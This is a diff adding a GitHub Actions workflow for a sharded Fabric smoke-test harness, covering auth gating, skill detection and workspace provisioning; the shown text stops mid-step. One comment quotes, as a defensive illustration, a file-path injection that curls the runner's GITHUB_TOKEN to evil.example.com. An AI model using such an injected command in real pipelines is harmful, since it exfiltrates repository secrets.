@@ -1,0 +1,1666 @@
+name: Fabric Smoke (Vally Harness, Shared Test Tenant)
+
+# Vally-driven smoke harness running alongside the legacy testFabricSkills.ps1
+# path (fabric-smoke-ephemeral.yml). Mirrors the same auth gate (Phase A direct
+# secrets / Phase B OIDC + Key Vault / skip) and setup gate (ephemeral workspace
+# provision via tests/testdata/setup_test_env.py) so signal is comparable.
+#
+# Structure (5 jobs):
+#   - setup:     auth-mode gate (Phase A / Phase B / skip) AND provisioning of
+#                a SINGLE ephemeral Fabric workspace that all shards share.
+#                Consolidating provisioning here (instead of per-shard) avoids
+#                the concurrent 5x workspace-create burst that was hitting the
+#                Fabric tenant provisioning throttle (HTTP 429).
+#   - grader-unit-tests: Pester unit tests for the shared _lib helper (mocked,
+#                no Fabric calls). Proves OUR PowerShell is correct independent
+#                of tenant state; per-skill verifier scripts are deliberately
+#                NOT Pester-tested (see tests/evals/README.md for rationale).
+#   - shard:     5-way matrix. Each shard authenticates and runs a deterministic
+#                slice of the smoke suite via tests/run-vally-eval.ps1
+#                -ShardIndex/-ShardCount, targeting the SHARED workspace from
+#                setup outputs. Per-shard concurrency is --workers 3, so 5x3 =
+#                15 concurrent stimulus sessions across the matrix.
+#   - summarise: always-runs aggregation of the per-shard result artifacts into
+#                a single job summary. Also owns cleanup of the shared workspace
+#                (runs `if: always()` so a failed shard does not leak it). Fails
+#                when no trial results were produced so a harness crash cannot
+#                render as a green 0/0 outcome.
+#   - nightly-alert: issue-based alerting for failed scheduled runs only.
+#
+# Triggered on:
+#   - pull_request against main, paths-filtered to the eval/skill/common surface
+#     vally loads plus the setup scripts the workflow invokes. The detect job
+#     then narrows the run to ONLY the eval dirs the touched skills map to.
+#   - schedule (nightly), which skips detect and runs the FULL suite as a daily
+#     safety net so the per-PR scoping cannot let a cross-cutting regression slip.
+#   - workflow_dispatch for ad-hoc runs (post-merge regression, debugging), which
+#     also skips detect and runs the full suite (or a chosen suite).
+#
+# Crucially, when neither Phase A nor Phase B secrets are configured (the
+# expected state on a fork PR that does not inherit org secrets), the setup gate
+# exits success with mode=skip so this gate cannot false-fail the PR.
+#
+# Primary CI gate after the Vally cutover. fabric-smoke-{ephemeral,pr-touched}.yml
+# are workflow_dispatch-only break-glass and no longer auto-fire. See
+# docs/legacy-smoke-break-glass.md for the manual-dispatch runbook.
+
+on:
+  pull_request:
+    # Default types are [opened, synchronize, reopened]. We add ready_for_review
+    # so that flipping a draft PR to ready fires a fresh run, otherwise the
+    # status panel shows the last (draft-skipped) run frozen in place and the
+    # draft-gated jobs (detect, grader-unit-tests, shard, summarise) never get
+    # a chance to actually execute against the now-ready PR.
+    types: [opened, synchronize, reopened, ready_for_review]
+    branches:
+      - main
+    paths:
+      - 'tests/evals/**'
+      - 'tests/vally-ci/**'
+      - '.vally.yaml'
+      - 'tests/run-vally-eval.ps1'
+      - 'tests/testdata/setup_test_env.py'
+      - 'build/build_plugins.py'
+      - '.github/workflows/fabric-smoke-vally.yml'
+      - '.github/actions/vally-fabric-auth/**'
+      - '.github/scripts/retry.sh'
+      - '.github/scripts/vally_nightly_alert.py'
+      - 'common/**'
+      - 'skills/**'
+      - 'plugins/**'
+  schedule:
+    # 19:00 UTC daily = 1 hour after the legacy nightly smoke (18:00 UTC).
+    # Stagger to avoid tenant contention on the shared workspace concurrency group.
+    - cron: '0 19 * * *'
+  workflow_dispatch:
+    inputs:
+      suite:
+        description: 'Vally suite to run (smoke, ci, consumption, authoring, operations).'
+        required: false
+        default: 'smoke'
+      runs:
+        description: 'Trials per stimulus. Default 1 for PR-cycle signal (bumped later once steady-state runtime is known).'
+        required: false
+        default: '1'
+      workers:
+        description: 'Concurrent stimulus sessions per shard (vally --workers). Default 3; 5 shards x 3 = 15 concurrent.'
+        required: false
+        default: '3'
+      baseline-mode:
+        description: 'Run in baseline mode (NO Fabric skills loaded). Default false. Use to produce a "without skills" comparison run; baseline failures are informational, not a gate.'
+        required: false
+        type: boolean
+        default: false
+      fail-on-regression:
+        description: 'Fail summarise (exit 1) if any trial entry in results.jsonl has gradeResult.passed=false. Default false (shadow-window posture: surface as warnings). Flip to true once the harness leaves shadow and per-trial pass/fail is the gate. Distinct from the unconditional merge-gate which fails when any STIM has any grader fail across any trial.'
+        required: false
+        type: boolean
+        default: false
+      gate-on-stim-fail:
+        description: 'Gate A (merge gate): exit 1 when any STIM has >=1 grader fail. Default false during the calibration window (surface as PR sticky comment + warning, non-blocking). Flip to true once stims are driven green and Vally is the hard primary gate.'
+        required: false
+        type: boolean
+        default: false
+      eval-dirs:
+        description: 'Optional comma-separated eval dir names to scope the run (e.g. "eventhouse-authoring-cli" or "eventhouse-authoring-cli,sqldw-consumption-cli"). Empty = full suite. Useful for ad-hoc per-skill testing without firing the full smoke suite.'
+        required: false
+        default: ''
+
+permissions:
+  contents: read
+  # id-token: write is granted per-job to setup, shard, and summarise --
+  # all three invoke vally-fabric-auth, whose Phase B path uses
+  # azure/login@v2 OIDC. detect needs pull-requests: read (it calls
+  # `gh api pulls/N/files`); grader-unit-tests carries contents: read
+  # only -- least privilege.
+
+# Per-source concurrency:
+#   - PR runs use a per-PR sub-group so a new push cancels the in-flight run
+#     for that PR (saves runner minutes on stale commits).
+#   - schedule and workflow_dispatch each get their own slot so neither can
+#     starve the other if they happen to overlap.
+# Fallback was previously 'main' for non-PR events, which lumped schedule +
+# workflow_dispatch into one queue and reproduced the starvation bug observed
+# on the legacy ephemeral harness on 2026-06-02. Using github.event_name keeps
+# each event class isolated.
+concurrency:
+  group: fabric-smoke-vally-${{ github.event.pull_request.number || github.event_name }}
+  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
+
+jobs:
+  # -----------------------------------------------------------------
+  # vally-ci-unit-tests: Pester unit tests for the three .ps1 modules
+  # extracted from this workflow (Classify-VallyExit, Aggregate-VallyResults,
+  # Format-VallyJobSummary). Runs in parallel with detect/setup/shard so a
+  # regression in the parsing/classification logic surfaces in <2 minutes
+  # without waiting for a full smoke run. Ubuntu runner because pwsh-on-ubuntu
+  # is the cheapest path and the extracted code is pure pwsh (no Windows-only
+  # APIs).
+  # -----------------------------------------------------------------
+  vally-ci-unit-tests:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10 # v6.0.3
+      - name: Install Pester 5
+        shell: pwsh
+        run: |
+          if (-not (Get-Module -ListAvailable -Name Pester | Where-Object { $_.Version.Major -ge 5 })) {
+              Install-Module -Name Pester -RequiredVersion 5.6.1 -Force -SkipPublisherCheck -Scope CurrentUser
+          }
+      - name: Run vally-ci Pester tests
+        shell: pwsh
+        run: pwsh tests/vally-ci/_run-unit-tests.ps1
+
+  # -----------------------------------------------------------------
+  # detect: PR-only. Read the PR's changed files, map touched skills/evals
+  # to vally eval dirs, and emit a comma-separated dir list (or "ALL" when an
+  # infrastructure file is touched). Mirrors fabric-smoke-pr-touched.yml's
+  # detect logic but maps to tests/evals/<dir> instead of tests.json entries.
+  # Skipped on schedule + workflow_dispatch (those always run the full suite).
+  # -----------------------------------------------------------------
+  detect:
+    # Only PRs need detection -- nightly + workflow_dispatch always run full suite.
+    if: github.event_name == 'pull_request' && github.event.pull_request.draft == false
+    runs-on: ubuntu-latest
+    # Scoped least-privilege override (job-level permissions REPLACE workflow-level,
+    # they do not merge): detect only needs to read repo content (checkout) and the
+    # PR's changed-files list (gh api pulls/N/files). It does NOT need id-token:write.
+    permissions:
+      contents: read
+      pull-requests: read
+    outputs:
+      eval-dirs: ${{ steps.detect.outputs.eval-dirs }}
+      matched-count: ${{ steps.detect.outputs.matched-count }}
+      touched-skills: ${{ steps.detect.outputs.touched-skills }}
+      # Dynamic shard sizing. shard-json is a JSON array consumed by the
+      # matrix expression in the shard job (see strategy.matrix.shard below);
+      # shard-count is the same value as an integer string, surfaced for
+      # diagnostics (detection summary table). The shard job's SHARD_COUNT
+      # env is derived from strategy.job-total at runtime -- shard-count is
+      # NOT the source of truth for runtime sharding. Defaults to the static
+      # 5-shard set when detect is skipped (schedule / workflow_dispatch).
+      shard-json: ${{ steps.detect.outputs.shard-json }}
+      shard-count: ${{ steps.detect.outputs.shard-count }}
+    steps:
+      # Pin to head.sha (not head.ref) to defend against TOCTOU race-swap.
+      - uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10 # v6.0.3
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      - name: Detect touched skills/evals
+        id: detect
+        shell: bash
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+        run: |
+          set -euo pipefail
+          # List changed files via the REST API with explicit pagination. The
+          # non-paginated `gh pr view --json files` truncates at ~100 files,
+          # which would miss touched skills on large changesets.
+          files=$(gh api --paginate "/repos/${{ github.repository }}/pulls/$PR_NUMBER/files" --jq '.[].filename')
+          file_count=$(printf '%s\n' "$files" | awk 'NF { count++ } END { print count + 0 }')
+          echo "Changed files ($file_count):"
+          echo "$files" | sed 's/^/  /'
+
+          # Infrastructure detection: a change to any of these could affect ANY
+          # eval, so run the full suite. awk keeps the no-match path explicit
+          # under set -e without masking unrelated command failures.
+          infra_re='^(common/|plugins/|\.vally\.yaml$|tests/run-vally-eval\.ps1$|tests/testdata/setup_test_env\.py$|tests/evals/_graders/|\.github/workflows/fabric-smoke-vally\.yml$|\.github/actions/vally-fabric-auth/|build/build_plugins\.py$)'
+          infra_touched=$(printf '%s\n' "$files" | awk -v re="$infra_re" '$0 ~ re { print; exit }')
+          if [ -n "$infra_touched" ]; then
+            infra_list=$(printf '%s\n' "$files" | awk -v re="$infra_re" '$0 ~ re { if (out) out = out "," $0; else out = $0 } END { print out }')
+            echo "Infrastructure file touched ($infra_touched). Running full suite."
+            echo "eval-dirs=ALL" >> "$GITHUB_OUTPUT"
+            echo "matched-count=ALL" >> "$GITHUB_OUTPUT"
+            echo "touched-skills=(infrastructure: $infra_list)" >> "$GITHUB_OUTPUT"
+            # Infra touched -> full suite -> all 5 shards. shard-json is the
+            # JSON-array form consumed by the matrix expression below.
+            echo "shard-json=[0,1,2,3,4]" >> "$GITHUB_OUTPUT"
+            echo "shard-count=5" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+
+          # Distinct skill names from skills/<name>/ paths.
+          touched=$(printf '%s\n' "$files" | awk -F/ '$1 == "skills" && $2 != "" { print $2 }' | sort -u)
+
+          # Distinct eval dir names from directly-touched tests/evals/<dir>/ paths.
+          # Eval-only PRs (tightening a grader/stim with no skills/<name>/ change)
+          # must still run the touched eval dir; otherwise detect would fall back
+          # to the sanity eval and the modified eval would never run (false green).
+          touched_evals=$(printf '%s\n' "$files" | awk -F/ '$1 == "tests" && $2 == "evals" && $3 != "" { print $3 }' | sort -u)
+
+          # Map touched skill names to existing eval dirs using eval metadata,
+          # not directory naming conventions. Each eval.yaml declares skill
+          # ownership via top-level tags.skill and/or environment.skills paths.
+          #
+          # Enforcement rule: if a skill under skills/<name>/ is touched, at
+          # least one eval dir must map to that skill. If not, fail detect
+          # rather than silently substituting a generic sanity eval.
+          detection=$(TOUCHED="$touched" python3 <<'PY'
+          import json
+          import os
+          import re
+
+          touched = [s.strip() for s in os.environ.get('TOUCHED', '').splitlines() if s.strip()]
+          evals_root = 'tests/evals'
+          existing = sorted(
+              d for d in os.listdir(evals_root)
+              if os.path.isdir(os.path.join(evals_root, d))
+              and os.path.exists(os.path.join(evals_root, d, 'eval.yaml'))
+          )
+
+          # Skills allowed to have no Vally eval per coverage policy.
+          allow_missing = set()
+          policy_path = os.path.join('.github', 'coverage-policy.yml')
+          try:
+              with open(policy_path, 'r', encoding='utf-8') as f:
+                  policy_lines = f.readlines()
+          except OSError:
+              policy_lines = []
+
+          in_allow = False
+          in_vally = False
+          allow_indent = -1
+          vally_indent = -1
+          for raw in policy_lines:
+              line = raw.rstrip('\r\n')
+              if not line.strip() or line.lstrip().startswith('#'):
+                  continue
+
+              indent = len(line) - len(line.lstrip(' '))
+              key = line.strip()
+
+              if not in_allow:
+                  if key == 'allowMissing:':
+                      in_allow = True
+                      allow_indent = indent
+                  continue
+
+              if indent <= allow_indent:
+                  break
+
+              if not in_vally:
+                  if key == 'vallyEval:':
+                      in_vally = True
+                      vally_indent = indent
+                  continue
+
+              if indent <= vally_indent:
+                  break
+
+              m = re.match(r'^([A-Za-z0-9._-]+):\s*$', key)
+              if m:
+                  allow_missing.add(m.group(1))
+
+          # Build metadata index: skill_name -> set(eval_dir)
+          # Accepted signals:
+          # 1) top-level tags.skill: <skill-name>
+          # 2) environment.skills entries that include .../skills/<skill-name>
+          skill_to_evals = {}
+          for d in existing:
+              eval_path = os.path.join(evals_root, d, 'eval.yaml')
+              text = ''
+              with open(eval_path, 'r', encoding='utf-8') as f:
+                  text = f.read()
+
+              declared = set()
+
+              # Broad but safe for current eval format: capture any scalar skill field.
+              for m in re.findall(r'(?m)^\s*skill:\s*([A-Za-z0-9._-]+)\s*$', text):
+                  declared.add(m)
+
+              for m in re.findall(r'skills/([A-Za-z0-9._-]+)', text):
+                  declared.add(m)
+
+              for declared_skill in declared:
+                  skill_to_evals.setdefault(declared_skill, set()).add(d)
+
+          result = set()
+          missing_skills = []
+          for skill in touched:
+              matched = skill_to_evals.get(skill, set())
+              if matched:
+                  result.update(matched)
+              elif skill in allow_missing:
+                  continue
+              else:
+                  missing_skills.append(skill)
+
+          print(json.dumps({
+              'mapped': sorted(result),
+              'missing_skills': sorted(set(missing_skills)),
+          }))
+          PY
+          )
+
+          mapped=$(DETECTION="$detection" TOUCHED_EVALS="$touched_evals" python3 <<'PY'
+          import json
+          import os
+
+          obj = json.loads(os.environ['DETECTION'])
+          mapped = set(obj.get('mapped', []))
+
+          # Union directly-touched eval dirs so eval-only PRs run the modified
+          # eval. Guard on eval.yaml existence so a deleted/renamed dir (or a
+          # non-eval file like tests/evals/README.md) cannot route to a
+          # non-existent eval. Skill-mapping enforcement above is unaffected
+          # (it only applies to touched skills under skills/<name>/).
+          evals_root = 'tests/evals'
+          for d in (s.strip() for s in os.environ.get('TOUCHED_EVALS', '').splitlines() if s.strip()):
+              if os.path.exists(os.path.join(evals_root, d, 'eval.yaml')):
+                  mapped.add(d)
+
+          print(','.join(sorted(mapped)))
+          PY
+          )
+
+          missing_skills=$(DETECTION="$detection" python3 <<'PY'
+          import json
+          import os
+
+          obj = json.loads(os.environ['DETECTION'])
+          print(','.join(obj.get('missing_skills', [])))
+          PY
+          )
+
+          touched_csv=$(printf '%s\n' "$touched" | paste -sd, -)
+
+          if [ -n "$missing_skills" ]; then
+            echo "::error::Touched skill(s) missing eval mapping/metadata: $missing_skills"
+            echo "::error::No eval metadata mapping found for one or more touched skills."
+            echo "::error::Ensure an eval.yaml declares the skill via tags.skill and/or environment.skills path (../../../skills/<skill>)."
+            echo "::error::Either add/update the missing eval(s) in this PR or revert the touched skill change."
+            exit 1
+          fi
+
+          # Nothing mapped: run a single lightweight sanity eval that still
+          # exercises auth + workspace provisioning + a Fabric API round-trip.
+          if [ -z "$mapped" ]; then
+            echo "No touched skill/eval mapped to an eval dir. Running single sanity eval."
+            echo "eval-dirs=dataflows-consumption-cli" >> "$GITHUB_OUTPUT"
+            echo "matched-count=1" >> "$GITHUB_OUTPUT"
+            if [ -z "$touched" ]; then
+              echo "touched-skills=(sanity)" >> "$GITHUB_OUTPUT"
+            else
+              echo "touched-skills=$touched_csv (no eval match; sanity)" >> "$GITHUB_OUTPUT"
+            fi
+            # 1 sanity eval -> 1 shard. No point spinning up 4 idle workspaces
+            # that would do zero work and just consume Fabric capacity.
+            echo "shard-json=[0]" >> "$GITHUB_OUTPUT"
+            echo "shard-count=1" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+
+          matched_count=$(printf '%s\n' "$mapped" | tr ',' '\n' | awk 'NF { count++ } END { print count + 0 }')
+          echo "Matched eval dirs ($matched_count): $mapped"
+          echo "eval-dirs=$mapped" >> "$GITHUB_OUTPUT"
+          echo "matched-count=$matched_count" >> "$GITHUB_OUTPUT"
+          echo "touched-skills=$touched_csv" >> "$GITHUB_OUTPUT"
+
+          # Right-size shards to the number of matched eval dirs, with a
+          # deliberate "cliff" at >= 4: any PR touching 4+ skills gets the
+          # full 5-shard set. Rationale:
+          #
+          # run-vally-eval.ps1 round-robins eval dirs over (SortedIndex %
+          # ShardCount). For matched_count > ShardCount, two or more eval
+          # dirs land on the same shard. The heaviest known eval
+          # (dataflows-authoring-cli, ~30 min worst case) sits at a known
+          # sort position; if the dynamic ShardCount pairs it with another
+          # heavy eval, the resulting shard wall-clock can approach 60 min
+          # against the 70-min step timeout. The "~30 min target" silently
+          # slips.
+          #
+          # The cliff at 4 captures most of the capacity-pressure win (the
+          # common case is PRs touching 1-3 skills; those drop from 5 to N
+          # workspaces) while preserving full parallelism for PRs touching
+          # 4+ skills (where pairing risk dominates the marginal saving of
+          # one idle shard). Floor at 1 defensively.
+          if [ "$matched_count" -ge 4 ]; then
+            shard_count=5
+          elif [ "$matched_count" -lt 1 ]; then
+            shard_count=1
+          else
+            shard_count="$matched_count"
+          fi
+          shard_json=$(seq -s, 0 $((shard_count - 1)) | sed 's/^/[/; s/$/]/')
+          echo "Right-sized to $shard_count shard(s) for $matched_count matched eval dir(s): $shard_json"
+          echo "shard-json=$shard_json" >> "$GITHUB_OUTPUT"
+          echo "shard-count=$shard_count" >> "$GITHUB_OUTPUT"
+
+      - name: Add detection summary to job log
+        if: always()
+        shell: bash
+        # Route all PR-controlled detect outputs through env: indirection so
+        # bash sees pre-quoted variables, never an interpolated `${{ }}` string.
+        # `touched-skills` and `eval-dirs` are derived from PR branch contents
+        # (file paths in the diff). A PR branch could include a file path like
+        # `skills/exploit"; curl https://evil.example.com/exfil?t=$GITHUB_TOKEN; echo "/test.txt`
+        # which, if inlined via `${{ }}`, would execute on the runner with the
+        # COPILOT_GITHUB_TOKEN + SP cert + az session in scope. `env:` makes
+        # the value a shell-quoted variable expansion, closing the injection.
+        # SHARDS is the new dynamic shard count from main; same injection
+        # surface applies (PR-derived contributor input feeds the matrix size
+        # calculation), so route it through env: as well rather than inline.
+        env:
+          TOUCHED: ${{ steps.detect.outputs.touched-skills }}
+          MATCHED: ${{ steps.detect.outputs.matched-count }}
+          EVALS: ${{ steps.detect.outputs.eval-dirs }}
+          SHARDS_COUNT: ${{ steps.detect.outputs.shard-count }}
+          SHARDS_JSON: ${{ steps.detect.outputs.shard-json }}
+        run: |
+          {
+            echo "## Vally smoke PR-scope detection"
+            echo ""
+            echo "| Field | Value |"
+            echo "|---|---|"
+            printf '| Touched skill names | `%s` |\n' "$TOUCHED"
+            printf '| Matched eval dirs | %s |\n' "$MATCHED"
+            printf '| Eval dirs to run | `%s` |\n' "$EVALS"
+            printf '| Shards | `%s` (`%s`) |\n' "$SHARDS_COUNT" "$SHARDS_JSON"
+          } >> "$GITHUB_STEP_SUMMARY"
+
+  # -----------------------------------------------------------------
+  # grader-unit-tests: Pester unit tests for the shared _lib helper
+  # module. Mocks `az` so the tests need no tenant credentials and
+  # prove only that OUR PowerShell code is correct (Fabric-side
+  # correctness is verified by the live shard job below, not here).
+  # Per-skill verifier scripts are deliberately NOT Pester-tested;
+  # see tests/evals/README.md for the rationale.
+  # Skipped on DRAFT PRs to match the detect/shard/summarise behaviour
+  # (still runs on schedule and workflow_dispatch).
+  # -----------------------------------------------------------------
+  grader-unit-tests:
+    runs-on: windows-latest
+    if: github.event_name != 'pull_request' || github.event.pull_request.draft == false
+    permissions:
+      contents: read
+    steps:
+      - uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10 # v6.0.3
+
+      - name: Ensure Pester 5
+        shell: pwsh
+        run: |
+          $pester = Get-Module -ListAvailable -Name Pester |
+            Where-Object {
+              $_.Version.Major -ge 5 -and
+              (Test-Path (Join-Path (Split-Path -Parent $_.Path) 'Pester.ps1'))
+            } |
+            Sort-Object Version -Descending |
+            Select-Object -First 1
+          if (-not $pester) {
+            Install-Module Pester -RequiredVersion 5.6.1 -Scope CurrentUser -Force -SkipPublisherCheck
+          }
+
+      - name: Run grader Pester tests
+        shell: pwsh
+        run: ./tests/evals/_graders/_run-unit-tests.ps1
+
+  # -----------------------------------------------------------------
+  # setup: pick Phase A or Phase B based on which secrets are set, then
+  # provision a SINGLE ephemeral Fabric workspace that every shard in this
+  # run shares. Workspace provisioning lives in setup (not per-shard) so
+  # the 5-way shard matrix issues ONE Fabric workspace-create call instead
+  # of five concurrent ones -- the simultaneous burst was tripping the
+  # tenant's provisioning throttle (HTTP 429). Per-run cleanup of the
+  # shared workspace happens in the summarise job (which `needs: [shard]`
+  # and runs `if: always()`, so a failed shard does not leak the workspace);
+  # the daily fabric-cleanup-stale-workspaces.yml cron remains as the
+  # safety net for cancelled runs and runner crashes.
+  # -----------------------------------------------------------------
+  setup:
+    # Skip on draft PRs: provisioning has no consumer there because detect
+    # (and therefore shard + summarise) skip on drafts, and summarise owns
+    # the workspace cleanup. Provisioning anyway would create one ephemeral
+    # Fabric workspace per draft-PR push that no harness step would reap;
+    # the daily cron would clean it up 6-30h later, but that defeats the
+    # whole point of this PR's throttle-reduction goal.
+    if: >-
+      github.event_name != 'pull_request' ||
+      github.event.pull_request.draft == false
+    runs-on: ubuntu-latest
+    # vally-fabric-auth (Phase B) uses azure/login@v2 OIDC, which requires
+    # id-token: write at the job level. Phase A (cert PEM from secrets)
+    # doesn't need OIDC but the composite invokes both paths conditionally,
+    # so the permission has to be granted unconditionally for setup to
+    # work under either mode.
+    permissions:
+      contents: read
+      id-token: write
+    # Workspace provisioning + lakehouse + semantic model + eventhouse +
+    # dataflow + activator + sample-data load against the Fabric tenant
+    # typically takes 6-10 minutes; bound it so a stuck setup call cannot
+    # hold the runner indefinitely.
+    timeout-minutes: 30
+    outputs:
+      ready: ${{ steps.gate.outputs.ready }}
+      mode: ${{ steps.gate.outputs.mode }}
+      workspace-id: ${{ steps.provision.outputs.workspace-id }}
+      workspace-name: ${{ steps.provision.outputs.workspace-name }}
+    steps:
+      - name: Detect auth mode
+        id: gate
+        env:
+          SP_APP_ID: ${{ secrets.SP_APP_ID }}
+          SP_CERT_BASE64: ${{ secrets.SP_CERT_BASE64 }}
+          SP_OBJECT_ID: ${{ secrets.SP_OBJECT_ID }}
+          TENANT_DOMAIN_SECRET: ${{ secrets.TENANT_DOMAIN }}
+          COPILOT_GITHUB_TOKEN: ${{ secrets.COPILOT_GITHUB_TOKEN }}
+          AZURE_CLIENT_ID: ${{ secrets.AZURE_CLIENT_ID }}
+          AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
+          AZURE_SUBSCRIPTION_ID: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
+          FABRIC_SMOKE_KV_NAME: ${{ vars.FABRIC_SMOKE_KV_NAME }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          if [ -z "$COPILOT_GITHUB_TOKEN" ]; then
+            echo "::warning::COPILOT_GITHUB_TOKEN secret is not configured. Vally smoke harness cannot invoke Copilot CLI."
+            echo "::warning::This is expected on fork PRs that do not inherit org secrets; gate exits success without running tests."
+            echo "mode=skip"  >> "$GITHUB_OUTPUT"
+            echo "ready=false" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+          phaseA_ok=true
+          for v in SP_APP_ID SP_CERT_BASE64 SP_OBJECT_ID TENANT_DOMAIN_SECRET; do
+            if [ -z "${!v}" ]; then phaseA_ok=false; break; fi
+          done
+          phaseB_ok=true
+          for v in AZURE_CLIENT_ID AZURE_TENANT_ID AZURE_SUBSCRIPTION_ID FABRIC_SMOKE_KV_NAME; do
+            if [ -z "${!v}" ]; then phaseB_ok=false; break; fi
+          done
+          if [ "$phaseA_ok" = "true" ]; then
+            echo "::notice::Using Phase A (direct secrets) auth path."
+            echo "mode=phaseA" >> "$GITHUB_OUTPUT"
+            echo "ready=true"  >> "$GITHUB_OUTPUT"
+          elif [ "$phaseB_ok" = "true" ]; then
+            echo "::notice::Using Phase B (OIDC + Key Vault) auth path."
+            echo "mode=phaseB" >> "$GITHUB_OUTPUT"
+            echo "ready=true"  >> "$GITHUB_OUTPUT"
+          else
+            echo "::warning::Neither Phase A nor Phase B secrets are configured. Skipping vally smoke run."
+            echo "::warning::Phase A needs: SP_APP_ID, SP_CERT_BASE64, SP_OBJECT_ID, TENANT_DOMAIN."
+            echo "::warning::Phase B needs: AZURE_CLIENT_ID, AZURE_TENANT_ID, AZURE_SUBSCRIPTION_ID, vars.FABRIC_SMOKE_KV_NAME."
+            echo "mode=skip"  >> "$GITHUB_OUTPUT"
+            echo "ready=false" >> "$GITHUB_OUTPUT"
+          fi
+
+      - name: Surface skipped-as-success banner
+        if: steps.gate.outputs.mode == 'skip'
+        shell: bash
+        run: |
+          echo "## **SKIPPED** -- fork PR or missing org secrets" >> "$GITHUB_STEP_SUMMARY"
+          echo "" >> "$GITHUB_STEP_SUMMARY"
+          echo "Smoke tests did NOT run on this commit. The green checkmark on this workflow means \"tests were skipped (expected)\", not \"tests passed\". This is the correct security behavior on fork PRs that cannot inherit org secrets, but reviewers should remember the green check is informational here, not a quality signal." >> "$GITHUB_STEP_SUMMARY"
+
+      # -----------------------------------------------------------------
+      # When the gate is ready, provision the SHARED ephemeral workspace
+      # once. All shards consume it via needs.setup.outputs.workspace-*,
+      # so the five-way matrix only triggers one Fabric workspace-create
+      # API call per run instead of five concurrent calls (the burst that
+      # was hitting the tenant provisioning throttle).
+      # -----------------------------------------------------------------
+      - name: Checkout repository
+        if: steps.gate.outputs.ready == 'true'
+        uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10 # v6.0.3
+
+      - name: Authenticate to Fabric tenant
+        if: steps.gate.outputs.ready == 'true'
+        uses: ./.github/actions/vally-fabric-auth
+        with:
+          mode: ${{ steps.gate.outputs.mode }}
+          sp-app-id: ${{ secrets.SP_APP_ID }}
+          sp-cert-base64: ${{ secrets.SP_CERT_BASE64 }}
+          sp-object-id: ${{ secrets.SP_OBJECT_ID }}
+          tenant-domain: ${{ secrets.TENANT_DOMAIN }}
+          azure-client-id: ${{ secrets.AZURE_CLIENT_ID }}
+          azure-tenant-id: ${{ secrets.AZURE_TENANT_ID }}
+          azure-subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
+          kv-name: ${{ vars.FABRIC_SMOKE_KV_NAME }}
+
+      - name: Setup Python (for setup_test_env.py)
+        if: steps.gate.outputs.ready == 'true'
+        uses: actions/setup-python@a309ff8b426b58ec0e2a45f0f869d46889d02405 # v6.2.0
+        with:
+          python-version: '3.11'
+
+      - name: Install setup_test_env.py dependencies
+        if: steps.gate.outputs.ready == 'true'
+        shell: bash
+        run: |
+          set -euo pipefail
+          # shellcheck source=.github/scripts/retry.sh
+          source "${GITHUB_WORKSPACE}/.github/scripts/retry.sh"
+          # pyarrow: required by generate_nyctlc_sample.py to read the parquet
+          # sample. Only installed here (in setup) because setup_test_env.py is
+          # the only consumer; shards no longer run it.
+          retry python -m pip install --upgrade pip
+          retry pip install pyarrow
+
+      - name: Provision shared ephemeral test environment
+        id: provision
+        if: steps.gate.outputs.ready == 'true'
+        shell: bash
+        env:
+          FABRIC_CAPACITY_ID: ${{ vars.FABRIC_CAPACITY_ID }}
+        run: |
+          set -euo pipefail
+          # shellcheck source=.github/scripts/retry.sh
+          source "${GITHUB_WORKSPACE}/.github/scripts/retry.sh"
+          # The composite action above exported TENANT_DOMAIN / SP_APP_ID /
+          # SP_OBJECT_ID / SP_CERT_PATH into GITHUB_ENV; validate before use so
+          # an empty-or-missing materialisation fails loud instead of producing
+          # an unauthenticated provision attempt.
+          for v in TENANT_DOMAIN SP_APP_ID SP_OBJECT_ID SP_CERT_PATH; do
+            if [ -z "${!v:-}" ]; then
+              echo "::error::$v env var is empty after vally-fabric-auth composite"
+              exit 1
+            fi
+          done
+          if [ ! -f "$SP_CERT_PATH" ]; then
+            echo "::error::SP cert PEM does not exist at $SP_CERT_PATH"
+            exit 1
+          fi
+          # Mirror tests/run-smoke-tests.ps1 step 1a and the legacy harness:
+          # az login --service-principal --certificate, then setup_test_env.py
+          # with --skip-login so it reuses the current az identity instead of
+          # attempting interactive flow.
+          echo "az login as service principal: $SP_APP_ID"
+          retry az login --service-principal --tenant "$TENANT_DOMAIN" --username "$SP_APP_ID" --certificate "$SP_CERT_PATH" --allow-no-subscriptions
+          setup_args=(--tenant "$TENANT_DOMAIN" --skip-login --sp-object-id "$SP_OBJECT_ID")
+          if [ -n "${FABRIC_CAPACITY_ID:-}" ]; then
+            capacity_trimmed=$(printf '%s' "$FABRIC_CAPACITY_ID" | tr -d '[:space:]')
+            if [ -z "$capacity_trimmed" ]; then
+              echo "::error::FABRIC_CAPACITY_ID is set but contains only whitespace. Either set a valid capacity GUID or unset the repo variable."
+              exit 1
+            fi
+            echo "Pinning to Fabric capacity: $capacity_trimmed"
+            setup_args+=(--capacity-id "$capacity_trimmed")
+          fi
+          # Retrying the full setup may leave a partial workspace if the first
+          # attempt failed after creation; the daily stale-workspace cleanup
+          # workflow reaps those bounded leftovers by name after the cutoff.
+          retry python tests/testdata/setup_test_env.py "${setup_args[@]}"
+          if [ ! -f tests/testdata/last_setup.json ]; then
+            echo "::error::setup_test_env.py did not produce tests/testdata/last_setup.json"
+            exit 1
+          fi
+          ws_id=$(python -c 'import json,sys; print(json.load(open("tests/testdata/last_setup.json")).get("workspace_id",""))')
+          ws_name=$(python -c 'import json,sys; print(json.load(open("tests/testdata/last_setup.json")).get("workspace_name",""))')
+          if [ -z "$ws_id" ] || [ -z "$ws_name" ]; then
+            echo "::error::workspace_id or workspace_name missing from last_setup.json"
+            exit 1
